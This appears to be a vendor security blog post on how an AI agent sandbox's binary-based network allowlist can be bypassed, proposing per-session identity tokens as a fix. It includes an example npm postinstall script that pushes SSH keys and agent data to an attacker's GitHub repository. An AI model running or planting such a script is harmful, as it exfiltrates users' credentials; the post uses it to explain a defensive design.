# The Uniformed Guard Problem: Why AI Agent Sandboxes Need Identity, Not Just Policy

*Justin Albrethsen · Highflame*

---

NemoClaw is NVIDIA's reference stack for running OpenClaw agents safely. It wraps the agent in an OpenShell sandbox with a deny-by-default network policy: no outbound connections unless they're explicitly listed. On paper, that's exactly the right design.

The problem is *what* gets listed.

## How the Policy Works

The baseline policy lives in a YAML file. Each entry names a set of allowed endpoints and the binaries that can reach them:

```yaml
github:
  endpoints:
    - host: github.com
      port: 443
      access: full
  binaries:
    - { path: /usr/bin/gh }
    - { path: /usr/bin/git }
```

The intent is clear: let the agent push code to GitHub. The enforcement is equally clear: OpenShell's proxy intercepts every outbound connection and checks whether the requesting process binary is on the allowlist for that host. If `/usr/bin/git` is talking to `github.com`, it's approved.

This is the entire trust boundary. Binary path in, decision out.

## The Problem

There's also a policy for npm:

```yaml
npm_registry:
  endpoints:
    - host: registry.npmjs.org
      port: 443
      access: full
  binaries:
    - { path: /usr/local/bin/npm }
```

That is reasonable, agents need to install dependencies. But here's the chain that follows:

1. The agent runs `npm install`. Approved npm binary, npm registry.
2. A malicious package executes a `postinstall` script. This is normal npm behavior; scripts run automatically after install.
3. The `postinstall` script runs:

```bash
git remote add exfil <https://github.com/attacker/dump>
git add /sandbox/.ssh /sandbox/.openclaw-data
git commit -m "."
git push exfil main
```

https://youtu.be/VAAs_-bj9PM

1. OpenShell's proxy sees `/usr/bin/git` connecting to `github.com:443`. It checks the policy. `/usr/bin/git` is on the list. **Approved.**

The sandbox never flagged it. It was doing its job correctly. The model just has no way to distinguish "the agent called git to push to the org repo" from "malware called git to push to an attacker repo." Both look identical at the binary level.

This is a textbook "Living off the Land" (LOTL) attack: the malware doesn't need to smuggle in its own exfiltration tools; it simply weaponizes the trusted binaries you've already provided.

> **🚨 The 2026 Reality Check**
> 
> 
> This isn’t a theoretical edge case. In late 2025, the **Shai-Hulud worm** exploited this exact vector, compromising over 500 npm packages to harvest developer secrets. Just last week (March 2026), the **LiteLLM** supply chain hit showed that even foundational agent libraries aren't safe from "registry-native" exploits that auto-execute upon installation.
> 

## Why This Is Structural

The sandbox is sound. Isolation is real, the deny-by-default posture is real, the binary restriction genuinely reduces the attack surface compared to no policy at all. The problem is that **policies are assigned to tools, not to agents**.

The guard checks your uniform, not your ID. Git is always trusted with GitHub. Node is always trusted with Telegram. It doesn't matter who's wearing the uniform or why.

Malware doesn't need to break out of the sandbox. It just needs to borrow the right binary.

## What ZeroID Fixes

The fix is to move the trust anchor from the binary to the agent session. Instead of "is this git?" the question becomes "did the authorized agent cryptographically attest to this specific operation?"

The flow would look like this:

- When the agent wants to push to GitHub, it requests a short-lived, scoped token from an identity layer outside the sandbox. The token includes a claim: `target_repo: github.com/org/project`, signed with a private key held by the host runtime on behalf of the agent.
- The proxy checks for the token before opening the tunnel. No token, no connection — regardless of which binary is calling.
- The policy becomes a scope constraint, not just an allowlist:

```yaml
github:
  endpoints:
    - host: github.com
      port: 443
  binaries:
    - { path: /usr/bin/git }
  caller_identity:
    required: true
    claims:
      target_repo: "github.com/org/project"
```

Malware running a `postinstall` script cannot produce this token. It doesn't hold the private key. It can call `/usr/bin/git` all it wants, but the proxy rejects the egress before the connection is established.

This is ZeroID: privileges assigned to agent sessions, not binaries.

## The Takeaway

It's worth noting that the attack chain above runs against NemoClaw's *default* configuration, which is the most locked-down state most users will ever see. In practice, agents need to do real work: fetch data from APIs, run code, talk to external services. Each new capability an operator enables opens another binary-scoped hole in the policy. The default config is a floor, not a ceiling.

Sandboxing AI agents is the right instinct. Deny-by-default network policy is the right instinct. Binary-scoped policy is a meaningful first layer, far better than no enforcement at all. But it is not sufficient on its own. Until we shift from binary policy to agent identity, every tool you give your agent is a gift to its next malicious dependency.
